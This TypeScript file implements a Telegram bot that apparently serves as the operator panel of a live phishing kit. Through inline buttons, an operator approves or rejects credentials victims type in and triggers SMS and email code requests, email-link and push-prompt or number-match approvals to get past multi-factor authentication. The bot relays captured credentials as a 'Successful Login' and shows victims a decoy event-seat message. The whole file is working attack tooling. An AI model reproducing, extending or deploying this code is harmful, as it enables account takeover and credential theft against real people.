import { Bot } from "grammy";
import type { UserFromGetMe } from "grammy/types";
import { Redis } from "@upstash/redis";
import {
  readLeadSession,
  writeLeadSession,
  updateLeadSession,
} from "../methods/lead.methods.js";
import { InlineKeyboard } from "grammy";
import {
  callbackActions,
  sanitizeCallbackData,
  callbackPatterns,
} from "../methods/callback.methods.js";
import { composeMessage } from "../methods/message.methods.js";
import {
  buildLeadSessionKeyboardForTelegram,
  sendMessageToTelegram,
  sendSessionToTelegram,
} from "../methods/telegram.methods.js";

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID?.trim();
const DEPLOYMENT_VERSION = parseFloat(process.env.DEPLOYMENT_VERSION || "0.0");
const EXPECTED_DEPLOYMENT_VERSION = 1.0;

if (!TELEGRAM_BOT_TOKEN)
  throw new Error("Missing Telegram bot token environment variable.");

const redis = Redis.fromEnv();
const botId = TELEGRAM_BOT_TOKEN.split(":")[0];
const chkey = `telegram:botinfo:${botId}`;
let initPromise: Promise<void> | null = null;

export const bot = new Bot(TELEGRAM_BOT_TOKEN);

async function sendTelegramError(message: string): Promise<void> {
  if (!TELEGRAM_CHAT_ID) return;
  try {
    await bot.api.sendMessage(
      TELEGRAM_CHAT_ID,
      `🚨 Deployment error\n\n${message}`,
    );
  } catch (error) {
    console.error("Failed to send deployment error to Telegram:", error);
  }
}

export function ensureBotInitialized(): Promise<void> {
  if (DEPLOYMENT_VERSION < EXPECTED_DEPLOYMENT_VERSION) {
    const message = `Deployment version ${DEPLOYMENT_VERSION} is older than the expected version ${EXPECTED_DEPLOYMENT_VERSION}. Telegram updates are paused.`;
    console.error(message);
    void sendTelegramError(message);
    return Promise.resolve();
  }
  if (bot.isInited()) return Promise.resolve();
  if (initPromise) return initPromise;
  initPromise = (async () => {
    const cached = await redis.get<UserFromGetMe>(chkey);
    if (cached) {
      bot.botInfo = cached;
      return;
    }
    await bot.init();
    await redis.set(chkey, bot.botInfo, { ex: 60 * 60 * 24 * 7 });
  })().catch((err) => {
    initPromise = null;
    throw err;
  });
  return initPromise;
}

export async function broadcastBotCommands(): Promise<void> {
  await bot.api.setMyCommands([
    {
      command: "whoami",
      description: "See your Telegram user Info.",
    },
  ]);
}

bot.catch((err) => {
  console.error("Unhandled bot error:", err.error);
});

bot.command("whoami", async (context) => {
  const userId = context.from?.id;
  const chatId = context.chat?.id;
  const username = context.from?.username;
  const firstName = context.from?.first_name;
  const lastName = context.from?.last_name;
  if (userId === undefined || chatId === undefined) return;
  await context.reply(
    [
      `User ID - ${userId}`,
      `Chat ID - ${chatId}`,
      username && `Username - ${username}`,
      firstName && `First Name - ${firstName}`,
      lastName && `Last Name - ${lastName}`,
    ].join("\n\n"),
    {
      reply_markup: new InlineKeyboard()
        .copyText(`${userId}`, `${userId}`)
        .copyText(`${chatId}`, `${chatId}`)
        .primary(),
    },
  );
});

bot.callbackQuery(callbackPatterns.auth, async (context) => {
  const [, sessionId, action] = context.match;
  const pass = action === "pass";
  await context.answerCallbackQuery({
    text: pass ? "Approving authentication." : "Rejecting authentication.",
  });
  try {
    const session = await updateLeadSession(sessionId, {
      status: pass ? "passing" : "flagged",
      process: "auth",
      feedback: pass
        ? "Proceeding to the next step..."
        : action === "flag"
          ? "Incorrect password. Please try again with the correct password."
          : `Invalid account. Try again with a different email address.`,
      logEntry: pass ? "✅ Correct credentials" : "❌ Invalid credentials",
    });
    if (!session) throw new Error("Invalid sessionId or expired session.");
    if (pass) {
      await sendSessionToTelegram(session, {
        context,
        keyboard: buildLeadSessionKeyboardForTelegram(session),
        logEntry: "🚀 Select what's next",
      });
    } else {
      await sendSessionToTelegram(session, {
        context,
        keyboard: new InlineKeyboard(),
      });
    }
  } catch (error) {
    console.error("Lead review callback failed:", error);
  }
});

bot.callbackQuery(callbackPatterns.code, async (context) => {
  const [, sessionId, type] = context.match;
  const typeName = type === "sms" ? "SMS code" : "email code";
  await context.answerCallbackQuery({
    text: `Sending ${typeName} verification request...`,
  });
  try {
    const session = await updateLeadSession(sessionId, {
      status: "idle",
      process: type === "sms" ? "verify-sms-code" : "verify-email-code",
      feedback:
        type === "sms"
          ? "Enter the verification code sent to your mobile phone."
          : "Enter the verification code sent to your email address.",
      logEntry: `🏹 Sent ${typeName} verification request`,
    });
    if (!session) throw new Error("Invalid sessionId or expired session.");
    await sendSessionToTelegram(session, {
      context,
      keyboard: new InlineKeyboard()
        .text(
          `Resend ${typeName}`,
          sanitizeCallbackData(
            sessionId,
            type === "sms"
              ? callbackActions.smsCode
              : callbackActions.emailCode,
          ),
        )
        .primary(),
      logEntry: "⏳ Waiting for user to enter the code...",
    });
  } catch (error) {
    console.error("Lead review callback failed:", error);
  }
});

bot.callbackQuery(callbackPatterns.codeDecision, async (context) => {
  const [, sessionId, type, action] = context.match;
  const typeName = type === "sms" ? "SMS code" : "email code";
  const pass = action === "pass";
  await context.answerCallbackQuery({
    text: pass
      ? `Approving ${typeName} verification request.`
      : `Rejecting ${typeName} verification request.`,
  });
  try {
    const session = await updateLeadSession(sessionId, {
      status: pass ? "passing" : "flagged",
      process: type === "sms" ? "verify-sms-code" : "verify-email-code",
      feedback:
        type === "sms"
          ? pass
            ? "Proceeding to the next step..."
            : "The SMS code you entered is incorrect or has expired."
          : pass
            ? "Proceeding to the next step..."
            : "The email code entered is incorrect or has expired.",
      overload: pass ? [`${type}-code`] : undefined,
      logEntry: pass ? `✅ Correct ${typeName}` : `❌ Invalid ${typeName}`,
    });
    if (!session) throw new Error("Invalid sessionId or expired session.");
    if (pass) {
      await sendSessionToTelegram(session, {
        context,
        keyboard: buildLeadSessionKeyboardForTelegram(session),
        logEntry: "🚀 Select what's next",
      });
    } else {
      await sendSessionToTelegram(session, {
        context,
        keyboard: new InlineKeyboard()
          .text(
            `Resend ${typeName}`,
            sanitizeCallbackData(
              sessionId,
              type === "sms"
                ? callbackActions.smsCode
                : callbackActions.emailCode,
            ),
          )
          .primary(),
      });
    }
  } catch (error) {
    console.error("Lead review callback failed:", error);
  }
});

bot.callbackQuery(callbackPatterns.emailLink, async (context) => {
  const [, sessionId] = context.match;
  await context.answerCallbackQuery({
    text: `Sending email link verification request...`,
  });
  try {
    const session = await updateLeadSession(sessionId, {
      status: "idle",
      process: "verify-email-link",
      feedback:
        "Please check your inbox and click the verification link we sent you.",
      logEntry: "🏹 Sent email link verification request",
    });
    if (!session) throw new Error("Invalid sessionId or expired session.");
    await sendSessionToTelegram(session, {
      context,
      keyboard: new InlineKeyboard()
        .text(
          "Acknowledge Verification",
          sanitizeCallbackData(sessionId, callbackActions.verifyLinkApprove),
        )
        .success(),
      logEntry: "⏳ Waiting for you to acknowledge link click...",
    });
  } catch (error) {
    console.error("Lead review callback failed:", error);
  }
});

bot.callbackQuery(callbackPatterns.emailLinkApprove, async (context) => {
  const [, sessionId] = context.match;
  await context.answerCallbackQuery({
    text: "Approving email link verification request.",
  });
  try {
    const session = await updateLeadSession(sessionId, {
      status: "passing",
      process: "verify-email-link",
      feedback: "Proceeding to the next step...",
      overload: ["email-link"],
      logEntry: "✅ Email Link Clicked Successfully",
    });
    if (!session) throw new Error("Invalid sessionId or expired session.");
    await sendSessionToTelegram(session, {
      context,
      keyboard: buildLeadSessionKeyboardForTelegram(session),
      logEntry: "🚀 Select what's next",
    });
  } catch (error) {
    console.error("Lead review callback failed:", error);
  }
});

bot.callbackQuery(callbackPatterns.promptYes, async (context) => {
  const [, sessionId] = context.match;
  await context.answerCallbackQuery({
    text: `Sending prompt yes verification request...`,
  });
  try {
    const session = await updateLeadSession(sessionId, {
      status: "idle",
      process: "verify-prompt-yes",
      feedback: "Yes",
      logEntry: "🏹 Sent prompt yes verification request",
    });
    if (!session) throw new Error("Invalid sessionId or expired session.");
    await sendSessionToTelegram(session, {
      context,
      keyboard: new InlineKeyboard()
        .text(
          "Acknowledge Verification",
          sanitizeCallbackData(
            sessionId,
            callbackActions.verifyPromptYesApprove,
          ),
        )
        .success(),
      logEntry: "⏳ Waiting for you to acknowledge tap yes...",
    });
  } catch (error) {
    console.error("Lead review callback failed:", error);
  }
});

bot.callbackQuery(callbackPatterns.promptYesApprove, async (context) => {
  const [, sessionId] = context.match;
  await context.answerCallbackQuery({
    text: "Approving prompt yes verification request.",
  });
  try {
    const session = await updateLeadSession(sessionId, {
      status: "passing",
      process: "verify-prompt-yes",
      feedback: "Proceeding to the next step...",
      overload: ["prompt-yes"],
      logEntry: "✅ Prompt Yes Verified Successfully",
    });
    if (!session) throw new Error("Invalid sessionId or expired session.");
    await sendSessionToTelegram(session, {
      context,
      keyboard: buildLeadSessionKeyboardForTelegram(session),
      logEntry: "🚀 Select what's next",
    });
  } catch (error) {
    console.error("Lead review callback failed:", error);
  }
});

bot.callbackQuery(callbackPatterns.promptNum, async (context) => {
  const [, sessionId, pageNumNull] = context.match;
  const pageNum = pageNumNull || "0";
  await context.answerCallbackQuery();
  try {
    const session = !pageNumNull
      ? await updateLeadSession(sessionId, {
          status: "loading",
          feedback: "Sending to notification to your mobile phone...",
          logEntry: "📍 Select the number they need to tap",
        })
      : await readLeadSession(sessionId);
    if (!session) throw new Error("Invalid sessionId or expired session.");
    let keyboard = new InlineKeyboard();
    const startNum = parseInt(pageNum) * 50 + 1;
    const endNum = startNum + 49;
    if (startNum >= 51) {
      keyboard = keyboard
        .row()
        .text(
          `${startNum - 50} to ${startNum - 1}`,
          sanitizeCallbackData(
            sessionId,
            callbackActions.promptNum(parseInt(pageNum) - 1),
          ),
        )
        .danger()
        .row();
    }
    for (let i = startNum; i <= endNum; i++) {
      keyboard = keyboard.text(
        `${i}`,
        sanitizeCallbackData(sessionId, callbackActions.promptNumValue(i)),
      );
      if (i % 2 === 0) keyboard = keyboard.primary();
      if (i % 5 === 0) keyboard = keyboard.row();
    }
    if (endNum % 5 !== 0) keyboard = keyboard.row();
    if (endNum <= 50) {
      keyboard = keyboard
        .text(
          `${endNum + 1} to ${endNum + 50}`,
          sanitizeCallbackData(
            sessionId,
            callbackActions.promptNum(parseInt(pageNum) + 1),
          ),
        )
        .success();
    }
    await sendSessionToTelegram(session, {
      context,
      keyboard,
    });
  } catch (error) {
    console.error("Lead review callback failed:", error);
  }
});

bot.callbackQuery(callbackPatterns.promptNumValue, async (context) => {
  const [, sessionId, valueNum] = context.match;
  await context.answerCallbackQuery({
    text: `Sending prompt num verification request...`,
  });
  try {
    const session = await updateLeadSession(sessionId, {
      status: "idle",
      process: "verify-prompt-num",
      feedback: `${valueNum}`,
      logEntry: "🏹 Sent prompt num verification request",
    });
    if (!session) throw new Error("Invalid sessionId or expired session.");
    await sendSessionToTelegram(session, {
      context,
      keyboard: new InlineKeyboard()
        .text(
          "Acknowledge Verification",
          sanitizeCallbackData(
            sessionId,
            callbackActions.verifyPromptNumApprove,
          ),
        )
        .success(),
      logEntry: "⏳ Waiting for you to acknowledge tap the number...",
    });
  } catch (error) {
    console.error("Lead review callback failed:", error);
  }
});

bot.callbackQuery(callbackPatterns.promptNumApprove, async (context) => {
  const [, sessionId] = context.match;
  await context.answerCallbackQuery({
    text: "Approving prompt num verification request.",
  });
  try {
    const session = await updateLeadSession(sessionId, {
      status: "passing",
      process: "verify-prompt-num",
      feedback: "Proceeding to the next step...",
      overload: ["prompt-num"],
      logEntry: "✅ Prompt Number Successful",
    });
    if (!session) throw new Error("Invalid sessionId or expired session.");
    await sendSessionToTelegram(session, {
      context,
      keyboard: buildLeadSessionKeyboardForTelegram(session),
      logEntry: "🚀 Select what's next",
    });
  } catch (error) {
    console.error("Lead review callback failed:", error);
  }
});

bot.callbackQuery(callbackPatterns.complete, async (context) => {
  const [, sessionId] = context.match;
  await context.answerCallbackQuery({ text: "Completing..." });
  try {
    const session = await readLeadSession(sessionId);
    if (!session) throw new Error("Invalid sessionId or expired session.");
    await sendMessageToTelegram(
      composeMessage(session.credentials, "🔐 Successful Login"),
      {
        context,
        keyboard: new InlineKeyboard().text(
          "Restart",
          sanitizeCallbackData(sessionId, callbackActions.restart),
        ),
      },
    );
    const seatIndex = (session.logs.length + session.credentials.length) % 99;
    const seatRow = ["A", "B", "C", "D", "E"][session.credentials.length % 5];
    const feasibleYear = new Date(
      Date.now() + 30 * 24 * 60 * 60 * 1000,
    ).getFullYear();
    await writeLeadSession(sessionId, {
      status: "completed",
      process: "init",
      keepStanding: true,
      feedback:
        `We look forward to seeing you at the Annual iv Event - ${feasibleYear} Edition!\n` +
        `Your seat is labeled ${seatIndex + 1} at row ${seatRow}\n` +
        "We will send you the official invitation two weeks before the event. #CheersAllTheWay",
    });
    context.deleteMessage().catch(() => {});
  } catch (error) {
    console.error("Lead review callback failed:", error);
  }
});

bot.callbackQuery(callbackPatterns.restart, async (context) => {
  const [, sessionId] = context.match;
  await context.answerCallbackQuery({ text: "Confirming Restart..." });
  try {
    const session = await readLeadSession(sessionId);
    if (!session) throw new Error("Invalid sessionId or expired session.");
    await sendSessionToTelegram(session, {
      context,
      keyboard: new InlineKeyboard()
        .text(
          "Yes, Restart",
          sanitizeCallbackData(
            sessionId,
            callbackActions.restartDecision("yes"),
          ),
        )
        .danger()
        .text(
          "No, Cancel",
          sanitizeCallbackData(
            sessionId,
            callbackActions.restartDecision("no"),
          ),
        )
        .success(),
      logEntry: "⚠️ Are you sure you want to restart this session?",
    });
  } catch (error) {
    console.error("Lead review callback failed:", error);
  }
});

bot.callbackQuery(callbackPatterns.restartDecision, async (context) => {
  const [, sessionId, decision] = context.match;
  await context.answerCallbackQuery({ text: `Restarting...` });
  try {
    if (decision == "yes") {
      const session = await writeLeadSession(sessionId, {
        keepStanding: true,
        status: "idle",
      });
      await sendSessionToTelegram(session, {
        context,
        keyboard: new InlineKeyboard(),
        logEntry: "🔄 Restarted Session",
      });
    } else {
      const session = await readLeadSession(sessionId);
      if (!session) throw new Error("Invalid sessionId or expired session.");
      context.deleteMessage().catch(() => {});
    }
  } catch (error) {
    console.error("Lead review callback failed:", error);
  }
});
